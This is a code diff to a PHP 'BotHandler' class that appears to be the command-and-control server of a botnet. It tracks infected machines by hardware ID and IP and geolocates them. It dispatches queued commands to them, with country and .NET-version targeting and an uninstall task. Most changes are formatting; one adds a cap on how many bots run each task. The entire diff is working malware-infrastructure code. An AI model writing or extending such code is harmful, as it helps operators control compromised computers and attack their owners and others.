@@ -38,7 +38,7 @@ class BotHandler
         }
 
         //  var_dump($_POST);
-        if(!empty($_POST["taskid"])){
+        if (!empty($_POST["taskid"])) {
             $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks_completed SET status = ? WHERE taskid = ? AND bothwid LIKE ?"); // AND taskid = ?
             $statement->execute(array($_POST["taskstatus"], $_POST["taskid"], $_POST["hwid"]));
             die("nice");
@@ -59,7 +59,7 @@ class BotHandler
 
 
             $reader = new Reader(__DIR__ . '/../../Geo/GeoLite2-City.mmdb');
-            
+
             if (!empty($_SERVER['REMOTE_ADDR'])) {
                 $ip = $_SERVER['REMOTE_ADDR'];
                 $record = $reader->city($ip);
@@ -76,7 +76,6 @@ class BotHandler
             }
 
 
-
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
             $statement->execute(array($postbot["hwid"]));
             while ($row = $statement->fetch()) {
@@ -87,15 +86,19 @@ class BotHandler
             if ($botfound) {
 
 
-
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?  WHERE hwid = ?");
-                $statement->execute(array($ip,$postbot["hwid"]));
+                $statement->execute(array($ip, $postbot["hwid"]));
 
 
                 $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks ORDER BY id");
                 while ($com = $cmds->fetch(PDO::FETCH_ASSOC)) {
                     if ($com['status'] == "1") {
                         //$executions = $GLOBALS["pdo"]->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
+                        $executions_querry = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as executions FROM tasks_completed WHERE taskid = :i");
+                        $executions_querry->execute(array(":i" => $com['id']));
+                        if($com["execution_limit"] != 0 && $executions_querry->fetchColumn(0) >= $com["execution_limit"]){
+                            continue;
+                        }
                         $ae = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
                         $ae->execute(array(":i" => $com['id'], ":h" => $postbot["hwid"]));
                         if ($ae->fetchColumn(0) == 0) {
@@ -109,7 +112,7 @@ class BotHandler
                                     if (is_array($filter)) {
                                         // Search Country in Filter if not found die
                                         if (!empty($filter["country"])) {
-                                            if (!preg_match('/\b'.$country.'\b/',$filter["country"])) {
+                                            if (!preg_match('/\b' . $country . '\b/', $filter["country"])) {
                                                 continue;
                                             }
                                         }
@@ -123,34 +126,34 @@ class BotHandler
 
                                         if (!empty($filter["netFramwork"])) {
 
-                                                $framworkHelper = "";
-                                                if($postbot["netFramework2"] == "true"){
-                                                    $framworkHelper .= " net2 ";
-                                                }
+                                            $framworkHelper = "";
+                                            if ($postbot["netFramework2"] == "true") {
+                                                $framworkHelper .= " net2 ";
+                                            }
 
-                                                if($postbot["netFramework3"] == "true"){
-                                                    $framworkHelper .= " net3 ";
-                                                }
+                                            if ($postbot["netFramework3"] == "true") {
+                                                $framworkHelper .= " net3 ";
+                                            }
 
-                                                if($postbot["netFramework35"] == "true"){
-                                                    $framworkHelper .= " net35 ";
-                                                }
+                                            if ($postbot["netFramework35"] == "true") {
+                                                $framworkHelper .= " net35 ";
+                                            }
 
-                                                if($postbot["netFramework4"] == "true"){
-                                                    $framworkHelper .= " net4 ";
-                                                }
+                                            if ($postbot["netFramework4"] == "true") {
+                                                $framworkHelper .= " net4 ";
+                                            }
 
-                                                $frameworks = explode(",",$filter["netFramwork"]);
-                                                $allow = false;
-                                                foreach ($frameworks as $framework){
-                                                    if (preg_match('/\b'.trim($framework).'\b/',$framworkHelper)) {
-                                                        $allow = true;
-                                                    }
+                                            $frameworks = explode(",", $filter["netFramwork"]);
+                                            $allow = false;
+                                            foreach ($frameworks as $framework) {
+                                                if (preg_match('/\b' . trim($framework) . '\b/', $framworkHelper)) {
+                                                    $allow = true;
                                                 }
+                                            }
 
-                                                if(!$allow){
-                                                    continue;
-                                                }
+                                            if (!$allow) {
+                                                continue;
+                                            }
                                         }
                                     }
                                 }
@@ -159,7 +162,7 @@ class BotHandler
                             if ($com["task"] == "uninstall") {
                                 echo $com["id"] . ";uninstall;uninstall";
                             } else {
-                                echo $com["id"] . ";".$com["task"].";" . $com["command"];
+                                echo $com["id"] . ";" . $com["task"] . ";" . $com["command"];
                             }
                             //send taskID
 
@@ -213,11 +216,6 @@ class BotHandler
 
 
     }
-
-
-
-
-
 
 
 }
